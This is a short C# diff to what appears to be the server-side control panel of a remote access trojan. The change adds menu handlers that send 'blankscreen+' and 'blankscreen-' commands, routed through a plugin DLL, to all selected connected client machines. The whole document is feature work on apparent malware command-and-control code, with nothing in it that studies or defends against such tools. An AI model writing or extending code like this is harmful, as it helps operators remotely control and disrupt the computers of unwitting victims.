@@ -1006,14 +1006,14 @@ namespace Server
             }
         }
 
-        private void BlankScreenToolStripMenuItem_Click(object sender, EventArgs e)
+        private void RunToolStripMenuItem2_Click(object sender, EventArgs e)
         {
             try
             {
                 if (listView1.SelectedItems.Count > 0)
                 {
                     MsgPack packet = new MsgPack();
-                    packet.ForcePathObject("Packet").AsString = "blankscreen";
+                    packet.ForcePathObject("Packet").AsString = "blankscreen+";
 
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "plugin";
@@ -1033,6 +1033,32 @@ namespace Server
             }
         }
 
+        private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack packet = new MsgPack();
+                    packet.ForcePathObject("Packet").AsString = "blankscreen-";
+
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Extra.dll"));
+                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                    foreach (Clients client in GetSelectedClients())
+                    {
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
 
         #endregion
 
@@ -1680,7 +1706,6 @@ namespace Server
 
         [DllImport("uxtheme", CharSet = CharSet.Unicode)]
         public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
-
 
     }
 }
